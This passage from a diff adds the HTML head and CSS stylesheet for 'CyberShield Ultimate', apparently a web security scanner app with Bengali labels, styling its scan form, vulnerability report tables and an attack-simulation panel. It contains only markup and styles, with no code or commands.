@@ -1,0 +1,1796 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#020408">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="CyberShield">
+<meta name="description" content="World #1 AI-Powered Web Security Scanner — OWASP Top 10, 20+ checks, Bengali reports">
+<meta name="mobile-web-app-capable" content="yes">
+<title>CyberShield Ultimate</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Outfit:wght@400;600;700;800;900&display=swap&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #020408;
+  --s1: #080f1a;
+  --card: #0a1220;
+  --border: #112240;
+  --border2: #1a3a6e;
+  --a1: #00c8ff;
+  --a2: #0066ff;
+  --a3: #7000ff;
+  --green: #00e676;
+  --red: #ff3d57;
+  --orange: #ff8c00;
+  --yellow: #ffd600;
+  --teal: #00ffd0;
+  --text: #cdd9e5;
+  --muted: #4a6280;
+  --muted2: #2a4060;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Outfit', sans-serif;
+  min-height: 100vh;
+  overflow-x: hidden;
+  -webkit-overflow-scrolling: touch;
+  touch-action: manipulation;
+}
+::selection { background: rgba(0,200,255,.25); color: #fff; }
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: var(--s1); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+::-webkit-scrollbar-thumb:hover { background: var(--a1); }
+.bg-grid {
+  position: fixed; inset: 0; z-index: 0;
+  background-image:
+    linear-gradient(rgba(0,200,255,.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,200,255,.02) 1px, transparent 1px);
+  background-size: 55px 55px;
+  pointer-events: none;
+}
+.page {
+  position: relative; z-index: 1;
+  max-width: 960px; margin: 0 auto;
+  padding: 0 16px 80px;
+}
+
+/* TOPBAR */
+.topbar {
+  display: flex; align-items: center;
+  justify-content: space-between;
+  padding: 22px 0 0; flex-wrap: wrap; gap: 10px;
+}
+.logo { display: flex; align-items: center; gap: 12px; }
+.logo-icon {
+  width: 44px; height: 44px;
+  background: linear-gradient(135deg, var(--a1), var(--a2), var(--a3));
+  border-radius: 11px; display: grid; place-items: center;
+  font-size: 22px;
+  box-shadow: 0 0 30px rgba(0,200,255,.4);
+  animation: pulse 3s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%,100% { box-shadow: 0 0 25px rgba(0,200,255,.35); }
+  50% { box-shadow: 0 0 50px rgba(0,200,255,.6); }
+}
+.logo-name { font-size: 1.3rem; font-weight: 900; letter-spacing: -1px; }
+.logo-name b {
+  background: linear-gradient(90deg, var(--a1), var(--a2));
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.logo-sub {
+  font-size: .58rem; color: var(--muted);
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: 2px; margin-top: 2px;
+}
+.tbadge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .58rem;
+  border: 1px solid rgba(0,200,255,.3);
+  background: rgba(0,200,255,.05);
+  color: var(--a1); padding: 4px 10px;
+  border-radius: 20px; letter-spacing: 1px;
+}
+
+/* API SETUP BOX */
+#setupBox {
+  margin: 28px 0 0;
+  background: linear-gradient(135deg, rgba(0,102,255,.07), rgba(112,0,255,.04));
+  border: 1px solid var(--border2);
+  border-radius: 18px; padding: 22px 24px;
+  position: relative; overflow: hidden;
+  transition: opacity .5s ease, max-height .6s ease, padding .5s ease, margin .5s ease;
+  max-height: 300px;
+}
+#setupBox::before {
+  content: ''; position: absolute;
+  top: 0; left: 0; right: 0; height: 2px;
+  background: linear-gradient(90deg, var(--a1), var(--a2), var(--a3));
+}
+#setupBox.hidden {
+  opacity: 0; max-height: 0;
+  padding: 0; margin: 0;
+  pointer-events: none; overflow: hidden;
+}
+.setup-title {
+  font-size: .95rem; font-weight: 700;
+  margin-bottom: 5px;
+}
+.setup-desc {
+  font-size: .78rem; color: var(--muted);
+  margin-bottom: 14px; line-height: 1.6;
+}
+.setup-desc a { color: var(--a1); text-decoration: none; }
+.key-row { display: flex; gap: 8px; }
+#apiKeyInput {
+  flex: 1; min-width: 0;
+  background: var(--s1);
+  border: 1.5px solid var(--border2);
+  border-radius: 9px; color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 16px; padding: 11px 14px;
+  outline: none;
+  -webkit-appearance: none; appearance: none;
+}
+#apiKeyInput:focus { border-color: var(--a1); box-shadow: 0 0 0 3px rgba(0,200,255,.12); }
+#apiKeyInput::placeholder {
+  color: var(--muted);
+  font-family: 'Outfit', sans-serif;
+  font-size: .78rem;
+}
+#saveBtn {
+  background: linear-gradient(135deg, var(--a1), var(--a2));
+  color: #fff; border: none;
+  border-radius: 9px;
+  font-family: 'Outfit', sans-serif;
+  font-size: .82rem; font-weight: 700;
+  padding: 0 18px; cursor: pointer;
+  white-space: nowrap; min-height: 44px;
+  -webkit-tap-highlight-color: transparent;
+}
+#keySt {
+  margin-top: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .7rem; min-height: 16px;
+}
+#keySt.ok { color: var(--green); }
+#keySt.err { color: var(--red); }
+
+/* HERO */
+.hero {
+  text-align: center;
+  padding: 44px 0 36px;
+}
+.hero-eye {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .65rem; color: var(--a1);
+  letter-spacing: 3px; margin-bottom: 16px;
+  display: flex; align-items: center;
+  justify-content: center; gap: 10px;
+}
+.hero-eye::before, .hero-eye::after {
+  content: ''; width: 30px; height: 1px;
+  background: var(--border2);
+}
+.hero h1 {
+  font-size: clamp(1.9rem, 5vw, 3.4rem);
+  font-weight: 900; line-height: 1.05;
+  letter-spacing: -2px; margin-bottom: 14px;
+}
+.hero h1 .hl {
+  background: linear-gradient(90deg, var(--a1), var(--a2), var(--a3));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  display: block;
+}
+.hero p {
+  color: var(--muted); font-size: .88rem;
+  max-width: 480px; margin: 0 auto; line-height: 1.7;
+}
+
+/* SCANNER CARD */
+.scanner {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 20px; padding: 24px;
+  margin-bottom: 28px;
+  position: relative; overflow: hidden;
+}
+.scanner::before {
+  content: ''; position: absolute;
+  top: 0; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--a1), var(--a2), var(--a3), transparent);
+}
+.inp-row {
+  display: flex; gap: 10px; margin-bottom: 10px;
+}
+.url-wrap { flex: 1; position: relative; min-width: 0; }
+.url-ico {
+  position: absolute; left: 13px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--muted); font-size: .85rem;
+  pointer-events: none;
+}
+#urlInput {
+  width: 100%;
+  background: var(--s1);
+  border: 1.5px solid var(--border2);
+  border-radius: 10px; color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 16px;
+  padding: 13px 13px 13px 38px;
+  outline: none;
+  -webkit-appearance: none; appearance: none;
+}
+#urlInput:focus { border-color: var(--a1); box-shadow: 0 0 0 3px rgba(0,200,255,.12); }
+#urlInput::placeholder {
+  color: var(--muted);
+  font-family: 'Outfit', sans-serif;
+}
+#scanBtn {
+  background: linear-gradient(135deg, var(--a1), var(--a2), var(--a3));
+  color: #fff; border: none; border-radius: 10px;
+  font-family: 'Outfit', sans-serif;
+  font-size: .88rem; font-weight: 700;
+  padding: 0 20px; cursor: pointer;
+  white-space: nowrap;
+  min-width: 110px; min-height: 46px;
+  -webkit-tap-highlight-color: transparent;
+  box-shadow: 0 0 25px rgba(0,200,255,.25);
+}
+#scanBtn:disabled { opacity: .45; cursor: not-allowed; }
+#scanBtn:active { transform: scale(.97); }
+#saveBtn:active { transform: scale(.97); }
+#hackBtn:active { transform: scale(.98); }
+.fbtn:active { opacity: .7; }
+.fbtn-p:active { transform: scale(.97); }
+.dbtn:active { opacity: .7; }
+#clientInput {
+  width: 100%;
+  background: var(--s1);
+  border: 1.5px solid var(--border);
+  border-radius: 9px; color: var(--text);
+  font-family: 'Outfit', sans-serif;
+  font-size: 16px;
+  padding: 10px 14px; outline: none;
+  margin-bottom: 14px;
+  -webkit-appearance: none; appearance: none;
+}
+#clientInput::placeholder { color: var(--muted); }
+.depth-row {
+  display: flex; align-items: center;
+  gap: 10px; margin-bottom: 14px;
+  flex-wrap: wrap;
+}
+.depth-lbl {
+  font-size: .72rem;
+  font-family: 'JetBrains Mono', monospace;
+  color: var(--muted);
+}
+.depth-btns { display: flex; gap: 6px; }
+.dbtn {
+  background: var(--s1);
+  border: 1px solid var(--border2);
+  border-radius: 7px; color: var(--muted);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .68rem; padding: 5px 12px;
+  cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+  transition: all .2s;
+}
+.dbtn.active {
+  background: rgba(0,200,255,.12);
+  border-color: var(--a1); color: var(--a1);
+}
+.checks { display: flex; flex-wrap: wrap; gap: 6px; }
+.ck {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .63rem; padding: 3px 9px;
+  border-radius: 20px; border: 1px solid; opacity: .75;
+}
+.c1 { color: #f59e0b; border-color: #f59e0b40; background: rgba(245,158,11,.05); }
+.c2 { color: var(--red); border-color: rgba(255,61,87,.3); background: rgba(255,61,87,.05); }
+.c3 { color: var(--a1); border-color: rgba(0,200,255,.3); background: rgba(0,200,255,.05); }
+.c4 { color: #c084fc; border-color: rgba(192,132,252,.3); background: rgba(192,132,252,.05); }
+.c5 { color: var(--green); border-color: rgba(0,230,118,.3); background: rgba(0,230,118,.05); }
+.c6 { color: var(--teal); border-color: rgba(0,255,208,.3); background: rgba(0,255,208,.05); }
+.c7 { color: var(--orange); border-color: rgba(255,140,0,.3); background: rgba(255,140,0,.05); }
+.c8 { color: #fbbf24; border-color: rgba(251,191,36,.3); background: rgba(251,191,36,.05); }
+
+/* PROGRESS */
+#progSection { display: none; margin-bottom: 24px; }
+.prog-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 16px; padding: 22px 24px;
+}
+.prog-top {
+  display: flex; justify-content: space-between;
+  margin-bottom: 12px;
+}
+.prog-lbl {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .74rem; color: var(--a1);
+  display: flex; align-items: center; gap: 7px;
+}
+.pdot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--a1);
+  box-shadow: 0 0 8px var(--a1);
+  animation: pd .8s ease-in-out infinite alternate;
+}
+@keyframes pd {
+  from { opacity: .4; }
+  to { opacity: 1; box-shadow: 0 0 14px var(--a1); }
+}
+.prog-pct {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .74rem; color: var(--muted);
+}
+.prog-track {
+  height: 3px; background: var(--border);
+  border-radius: 2px; overflow: hidden;
+  margin-bottom: 16px;
+}
+.prog-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--a1), var(--a2), var(--a3));
+  border-radius: 2px;
+  transition: width .5s ease; width: 0%;
+}
+.log-box {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .68rem; max-height: 150px;
+  overflow-y: auto;
+  display: flex; flex-direction: column; gap: 4px;
+}
+.li { display: flex; gap: 8px; }
+.lts { color: var(--muted2); flex-shrink: 0; }
+.li.ok .lm { color: var(--green); }
+.li.warn .lm { color: var(--orange); }
+.li.err .lm { color: var(--red); }
+.li.ai .lm { color: #c084fc; }
+.li.info .lm { color: var(--muted); }
+.li.scan .lm { color: var(--teal); }
+
+/* RESULTS */
+#resSection { display: none; }
+.rtop {
+  display: flex; justify-content: space-between;
+  align-items: flex-start;
+  margin-bottom: 22px; flex-wrap: wrap; gap: 12px;
+}
+.rtitle { font-size: 1.1rem; font-weight: 700; }
+.rmeta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .64rem; color: var(--muted);
+  text-align: right; line-height: 1.7;
+}
+.rmeta span { color: var(--a1); display: block; }
+.slb {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .64rem; color: var(--a1);
+  letter-spacing: 2.5px; text-transform: uppercase;
+  margin: 24px 0 12px;
+  display: flex; align-items: center; gap: 8px;
+}
+.slb::after {
+  content: ''; flex: 1; height: 1px;
+  background: var(--border);
+}
+
+/* SCORE */
+.score-band {
+  display: flex; gap: 18px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 16px; padding: 20px;
+  margin-bottom: 16px;
+  align-items: center; flex-wrap: wrap;
+}
+.score-ring {
+  width: 88px; height: 88px; border-radius: 50%;
+  border: 3px solid currentColor;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+  flex-shrink: 0;
+  animation: rg 2.5s ease-in-out infinite alternate;
+}
+@keyframes rg {
+  from { box-shadow: 0 0 12px currentColor; }
+  to { box-shadow: 0 0 35px currentColor; }
+}
+.snum { font-size: 2rem; font-weight: 700; line-height: 1; }
+.sden { font-size: .58rem; color: var(--muted); }
+.slabel { font-size: 1rem; font-weight: 700; margin-bottom: 5px; }
+.sreason { font-size: .8rem; color: var(--muted); line-height: 1.6; }
+
+/* SEV BOXES */
+.sev-grid {
+  display: grid; grid-template-columns: repeat(4,1fr);
+  gap: 10px; margin-bottom: 16px;
+}
+.sbox {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 16px 10px;
+  text-align: center; position: relative; overflow: hidden;
+}
+.sbox::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 2px; }
+.sbox.sc2::after { background: var(--red); }
+.sbox.sh2::after { background: var(--orange); }
+.sbox.sm2::after { background: var(--yellow); }
+.sbox.sl2::after { background: var(--green); }
+.sn { font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; line-height: 1; margin-bottom: 4px; }
+.sbox.sc2 .sn { color: var(--red); }
+.sbox.sh2 .sn { color: var(--orange); }
+.sbox.sm2 .sn { color: var(--yellow); }
+.sbox.sl2 .sn { color: var(--green); }
+.st { font-size: .6rem; color: var(--muted); font-family: 'JetBrains Mono', monospace; letter-spacing: 1px; }
+
+/* AI BOXES */
+.ai-box {
+  background: rgba(0,200,255,.04);
+  border: 1px solid rgba(0,200,255,.12);
+  border-radius: 14px; padding: 18px 20px;
+  margin-bottom: 12px; font-size: .86rem; line-height: 1.8;
+}
+.client-box {
+  background: rgba(0,230,118,.04);
+  border: 1px solid rgba(0,230,118,.12);
+  border-radius: 14px; padding: 16px 20px;
+  margin-bottom: 16px; font-size: .84rem; line-height: 1.75;
+}
+.client-box::before {
+  content: '💬 ক্লায়েন্টের বার্তা';
+  display: block;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .6rem; color: var(--green);
+  letter-spacing: 1.5px; margin-bottom: 8px;
+}
+
+/* RISK BARS */
+.risk-wrap {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 14px; padding: 18px 20px; margin-bottom: 16px;
+}
+.rmb {
+  display: grid; grid-template-columns: 130px 1fr 44px;
+  align-items: center; gap: 10px; margin-bottom: 8px;
+}
+.rmb:last-child { margin-bottom: 0; }
+.rmb-lbl { font-size: .76rem; }
+.rmb-track { height: 5px; background: var(--border); border-radius: 3px; overflow: hidden; }
+.rmb-fill { height: 100%; border-radius: 3px; width: 0; transition: width 1.2s ease; }
+.rmb-pct { font-family: 'JetBrains Mono', monospace; font-size: .66rem; color: var(--muted); text-align: right; }
+
+/* ATTACK VECTORS */
+.av-grid {
+  display: grid; grid-template-columns: repeat(3,1fr);
+  gap: 10px; margin-bottom: 16px;
+}
+.av-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 14px 16px;
+}
+.av-card.found { border-color: rgba(255,61,87,.25); background: rgba(255,61,87,.03); }
+.av-card.safe { border-color: rgba(0,230,118,.2); background: rgba(0,230,118,.02); }
+.av-icon { font-size: 1.4rem; margin-bottom: 6px; }
+.av-name { font-size: .78rem; font-weight: 600; margin-bottom: 3px; }
+.av-risk { font-family: 'JetBrains Mono', monospace; font-size: .62rem; margin-bottom: 6px; }
+.av-desc { font-size: .72rem; color: var(--muted); line-height: 1.5; }
+
+/* VULN TABLE */
+.vtable {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 16px; overflow: hidden; margin-bottom: 16px;
+}
+.vthead {
+  display: grid; grid-template-columns: 36px 1fr 80px 60px;
+  padding: 10px 16px;
+  background: var(--s1); border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .6rem; color: var(--muted);
+  letter-spacing: 1px; text-transform: uppercase;
+}
+.vrow {
+  display: grid; grid-template-columns: 36px 1fr 80px 60px;
+  padding: 14px 16px; border-bottom: 1px solid var(--border);
+  gap: 8px; transition: background .15s;
+}
+.vrow:hover { background: rgba(0,200,255,.03); }
+.vrow:last-child { border-bottom: none; }
+.vn { font-family: 'JetBrains Mono', monospace; font-size: .68rem; color: var(--muted2); padding-top: 2px; }
+.vtype { font-size: .8rem; font-weight: 600; line-height: 1.4; }
+.vtype small { font-size: .68rem; color: var(--muted); font-weight: 400; display: block; margin-top: 2px; }
+.vsev { font-family: 'JetBrains Mono', monospace; font-size: .6rem; font-weight: 700; padding: 3px 8px; border-radius: 5px; width: fit-content; }
+.sc { background: rgba(255,61,87,.14); color: var(--red); }
+.sh { background: rgba(255,140,0,.14); color: var(--orange); }
+.sm { background: rgba(255,214,0,.14); color: var(--yellow); }
+.sl { background: rgba(0,230,118,.14); color: var(--green); }
+.vcvss { font-family: 'JetBrains Mono', monospace; font-size: .68rem; padding-top: 2px; }
+.vimpact {
+  grid-column: 1 / -1;
+  border-left: 2px solid var(--red);
+  background: rgba(255,61,87,.05);
+  padding: 7px 12px; border-radius: 0 6px 6px 0;
+  font-size: .74rem; color: rgba(255,150,150,.8); line-height: 1.6;
+}
+.vimpact::before { content: '⚡ প্রভাব: '; color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: .6rem; }
+.vrem {
+  grid-column: 1 / -1;
+  border-left: 2px solid var(--a3);
+  background: rgba(112,0,255,.05);
+  padding: 7px 12px; border-radius: 0 6px 6px 0;
+  font-size: .74rem; color: rgba(180,200,255,.7); line-height: 1.6;
+}
+.vrem::before { content: '⚙ সমাধান: '; color: var(--a3); font-family: 'JetBrains Mono', monospace; font-size: .6rem; }
+.vtags { grid-column: 1 / -1; display: flex; flex-wrap: wrap; gap: 5px; }
+.vtag {
+  font-family: 'JetBrains Mono', monospace; font-size: .58rem;
+  padding: 2px 6px; border-radius: 4px;
+  background: rgba(0,200,255,.08); color: var(--a1);
+  border: 1px solid rgba(0,200,255,.15);
+}
+
+/* COMPLIANCE */
+.comp-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 10px; margin-bottom: 16px; }
+.comp-card { background: var(--card); border: 1px solid var(--border); border-radius: 11px; padding: 12px; text-align: center; }
+.comp-name { font-size: .68rem; font-family: 'JetBrains Mono', monospace; color: var(--muted); margin-bottom: 5px; }
+.comp-val { font-size: .75rem; font-weight: 600; }
+.cp { color: var(--green); } .cf { color: var(--red); } .cw { color: var(--yellow); }
+
+/* REM CARDS */
+.rem-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
+.rem-card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; overflow: hidden; }
+.rem-head { display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; background: var(--s1); border-bottom: 1px solid var(--border); }
+.rem-type { font-size: .84rem; font-weight: 600; }
+.prio { font-family: 'JetBrains Mono', monospace; font-size: .6rem; padding: 3px 8px; border-radius: 20px; border: 1px solid; }
+.pnow { color: var(--red); border-color: rgba(255,61,87,.35); background: rgba(255,61,87,.08); }
+.pweek { color: var(--orange); border-color: rgba(255,140,0,.35); background: rgba(255,140,0,.08); }
+.pmonth { color: var(--green); border-color: rgba(0,230,118,.35); background: rgba(0,230,118,.08); }
+.rem-steps { padding: 14px 18px; display: flex; flex-direction: column; gap: 8px; }
+.rstep { display: flex; gap: 10px; align-items: flex-start; font-size: .8rem; line-height: 1.6; }
+.sdot { width: 20px; height: 20px; border-radius: 50%; background: rgba(0,200,255,.1); border: 1px solid rgba(0,200,255,.25); color: var(--a1); font-family: 'JetBrains Mono', monospace; font-size: .6rem; display: grid; place-items: center; flex-shrink: 0; }
+.code-snip { background: rgba(0,0,0,.3); border: 1px solid var(--border2); border-radius: 7px; padding: 9px 12px; font-family: 'JetBrains Mono', monospace; font-size: .68rem; color: var(--teal); margin-top: 6px; line-height: 1.65; overflow-x: auto; white-space: pre; }
+
+/* ACTION */
+.act-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 28px; }
+.act-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 16px 18px; }
+.act-phase { font-family: 'JetBrains Mono', monospace; font-size: .58rem; letter-spacing: 1px; margin-bottom: 7px; text-transform: uppercase; }
+.act-card:nth-child(1) .act-phase { color: var(--red); }
+.act-card:nth-child(2) .act-phase { color: var(--orange); }
+.act-card:nth-child(3) .act-phase { color: var(--green); }
+.act-body { font-size: .78rem; color: var(--muted); line-height: 1.65; }
+
+/* HACK SIM */
+.hack-banner {
+  background: linear-gradient(135deg, rgba(255,61,87,.08), rgba(255,140,0,.05));
+  border: 1px solid rgba(255,61,87,.25);
+  border-radius: 18px; padding: 22px 24px;
+  margin: 24px 0 0; position: relative; overflow: hidden;
+}
+.hack-banner::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--red), var(--orange), var(--yellow)); }
+.hack-inner { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 16px; }
+.hack-skull { font-size: 2.2rem; flex-shrink: 0; animation: sk 2s ease-in-out infinite alternate; }
+@keyframes sk { from { filter: drop-shadow(0 0 6px rgba(255,61,87,.5)); } to { filter: drop-shadow(0 0 18px rgba(255,61,87,.9)); } }
+.hack-title { font-size: .98rem; font-weight: 700; color: var(--red); margin-bottom: 4px; }
+.hack-desc { font-size: .78rem; color: var(--muted); line-height: 1.6; }
+#hackBtn {
+  width: 100%; background: linear-gradient(135deg, var(--red), #c0392b);
+  color: #fff; border: none; border-radius: 10px;
+  font-family: 'Outfit', sans-serif; font-size: .88rem; font-weight: 700;
+  padding: 13px; cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+  box-shadow: 0 0 20px rgba(255,61,87,.3);
+}
+#hackBtn:disabled { opacity: .5; }
+#simSection { display: none; margin-top: 16px; }
+
+/* SIM STYLES */
+.sim-hdr { background: rgba(255,61,87,.06); border: 1px solid rgba(255,61,87,.2); border-radius: 14px; padding: 18px 20px; margin-bottom: 16px; display: flex; gap: 14px; align-items: center; }
+.sim-hdr-icon { font-size: 1.8rem; flex-shrink: 0; }
+.sim-hdr-title { font-size: 1rem; font-weight: 700; color: var(--red); margin-bottom: 3px; }
+.sim-hdr-sub { font-size: .76rem; color: var(--muted); line-height: 1.6; }
+.sim-warn { background: rgba(255,214,0,.05); border: 1px solid rgba(255,214,0,.2); border-radius: 10px; padding: 12px 16px; font-size: .76rem; color: rgba(255,214,0,.85); margin-bottom: 16px; line-height: 1.6; }
+.sim-cards { display: flex; flex-direction: column; gap: 18px; }
+.sim-card { background: var(--card); border: 1px solid rgba(255,61,87,.2); border-radius: 16px; overflow: hidden; animation: fadeUp .4s ease both; }
+@keyframes fadeUp { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
+.sim-card-head { background: linear-gradient(135deg, rgba(255,61,87,.12), rgba(255,140,0,.06)); border-bottom: 1px solid rgba(255,61,87,.15); padding: 16px 20px; }
+.sim-head-top { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 6px; }
+.sim-vtype { font-size: .9rem; font-weight: 700; color: var(--red); }
+.sim-time { font-family: 'JetBrains Mono', monospace; font-size: .64rem; color: var(--red); background: rgba(255,61,87,.1); border: 1px solid rgba(255,61,87,.2); border-radius: 20px; padding: 3px 10px; white-space: nowrap; }
+.sim-hacker { font-size: .74rem; color: var(--muted); }
+.sim-body { padding: 20px; }
+.sim-tl { display: flex; flex-direction: column; position: relative; }
+.sim-tl::before { content: ''; position: absolute; left: 16px; top: 0; bottom: 0; width: 1px; background: linear-gradient(180deg, var(--red), var(--orange), var(--yellow), var(--green)); opacity: .25; }
+.sim-step { display: flex; gap: 14px; padding-bottom: 18px; position: relative; }
+.sim-step:last-child { padding-bottom: 0; }
+.sim-step-n { width: 32px; height: 32px; border-radius: 50%; display: grid; place-items: center; flex-shrink: 0; font-family: 'JetBrains Mono', monospace; font-size: .7rem; font-weight: 700; border: 2px solid; z-index: 1; }
+.p-recon .sim-step-n { background: rgba(100,130,200,.15); border-color: rgba(100,130,200,.4); color: #6482c8; }
+.p-scan .sim-step-n { background: rgba(255,214,0,.1); border-color: rgba(255,214,0,.3); color: var(--yellow); }
+.p-exploit .sim-step-n { background: rgba(255,61,87,.12); border-color: rgba(255,61,87,.35); color: var(--red); }
+.p-payload .sim-step-n { background: rgba(255,140,0,.1); border-color: rgba(255,140,0,.3); color: var(--orange); }
+.p-impact .sim-step-n { background: rgba(192,0,0,.15); border-color: rgba(255,0,0,.4); color: #ff4444; }
+.p-cover .sim-step-n { background: rgba(112,0,255,.12); border-color: rgba(112,0,255,.3); color: var(--a3); }
+.p-done .sim-step-n { background: rgba(0,230,118,.1); border-color: rgba(0,230,118,.3); color: var(--green); }
+.sim-step-c { flex: 1; padding-top: 4px; }
+.sim-phase { font-family: 'JetBrains Mono', monospace; font-size: .6rem; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 3px; }
+.p-recon .sim-phase { color: #6482c8; }
+.p-scan .sim-phase { color: var(--yellow); }
+.p-exploit .sim-phase { color: var(--red); }
+.p-payload .sim-phase { color: var(--orange); }
+.p-impact .sim-phase { color: #ff4444; }
+.p-cover .sim-phase { color: var(--a3); }
+.p-done .sim-phase { color: var(--green); }
+.sim-step-title { font-size: .84rem; font-weight: 600; margin-bottom: 4px; }
+.sim-step-desc { font-size: .76rem; color: var(--muted); line-height: 1.6; }
+.sim-code { background: rgba(0,0,0,.45); border: 1px solid rgba(255,61,87,.18); border-radius: 7px; padding: 9px 12px; font-family: 'JetBrains Mono', monospace; font-size: .68rem; color: #ff8888; margin-top: 7px; line-height: 1.65; overflow-x: auto; white-space: pre; }
+.sim-dmg { background: rgba(255,0,0,.07); border: 1px solid rgba(255,0,0,.18); border-radius: 9px; padding: 12px 16px; margin-top: 14px; }
+.sim-dmg-title { font-family: 'JetBrains Mono', monospace; font-size: .62rem; color: var(--red); letter-spacing: 1.5px; margin-bottom: 7px; }
+.sim-dmg-items { display: flex; flex-wrap: wrap; gap: 6px; }
+.sim-dmg-item { font-size: .72rem; background: rgba(255,61,87,.1); border: 1px solid rgba(255,61,87,.2); border-radius: 5px; padding: 3px 8px; color: rgba(255,120,120,.9); }
+.sim-real { background: rgba(255,214,0,.05); border: 1px solid rgba(255,214,0,.15); border-radius: 8px; padding: 10px 14px; margin-top: 10px; font-size: .74rem; color: rgba(255,214,0,.8); line-height: 1.6; }
+.sim-fix { background: rgba(0,230,118,.05); border: 1px solid rgba(0,230,118,.2); border-radius: 8px; padding: 10px 14px; margin-top: 8px; font-size: .76rem; color: rgba(100,255,180,.85); line-height: 1.6; }
+.sim-fix::before { content: 'এখনই সমাধান করুন: '; font-family: 'JetBrains Mono', monospace; font-size: .62rem; color: var(--green); }
+
+/* FOOTER BTNS */
+.fbtns { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 8px; }
+.fbtn { background: transparent; border: 1px solid var(--border2); color: var(--muted); font-family: 'Outfit', sans-serif; font-size: .78rem; padding: 9px 16px; border-radius: 9px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+.fbtn-p { background: linear-gradient(135deg, var(--a1), var(--a2)); color: #fff; border: none; font-family: 'Outfit', sans-serif; font-size: .78rem; font-weight: 600; padding: 9px 18px; border-radius: 9px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+
+/* SPINNER */
+.spin { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.25); border-top-color: #fff; border-radius: 50%; animation: spin .65s linear infinite; display: inline-block; vertical-align: middle; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.blink { animation: blink 1s step-end infinite; }
+@keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+
+/* PRINT */
+@media print {
+  body { background: #fff !important; color: #000 !important; }
+  .bg-grid, #setupBox, .scanner .checks, .depth-row, #progSection,
+  #hackBtn, #simSection, .fbtns, .hack-banner { display: none !important; }
+  .page { max-width: 100%; padding: 0 10px; }
+  .score-ring, .sbox, .ai-box, .client-box, .risk-wrap,
+  .av-card, .vtable, .comp-card, .rem-card, .act-card {
+    background: #f8f8f8 !important;
+    border-color: #ccc !important;
+    color: #000 !important;
+  }
+  .slb, .rtitle, .logo-name, .slabel { color: #000 !important; }
+  .muted, .muted2, .sreason, .act-body, .av-desc { color: #444 !important; }
+  .vsev.sc { background: #ffeeee !important; color: #c00 !important; }
+  .vsev.sh { background: #fff3e0 !important; color: #e65100 !important; }
+  .vsev.sm { background: #fffde7 !important; color: #f57f17 !important; }
+  .vsev.sl { background: #e8f5e9 !important; color: #1b5e20 !important; }
+  .prog-fill, .score-ring { box-shadow: none !important; }
+  a { color: #000 !important; text-decoration: none; }
+  @page { margin: 1cm; }
+}
